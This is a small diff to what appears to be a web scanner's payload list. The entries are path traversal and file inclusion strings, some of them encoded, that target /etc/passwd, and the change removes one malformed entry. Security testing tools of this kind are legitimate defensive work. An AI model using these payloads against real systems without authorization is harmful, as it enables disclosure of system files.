@@ -2,7 +2,6 @@
 payload:
 - '%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd'
 - ../../etc/passwd
-- ile:///etc/passwd
 - file:///etc/./passwd
 encoder:
 - Url
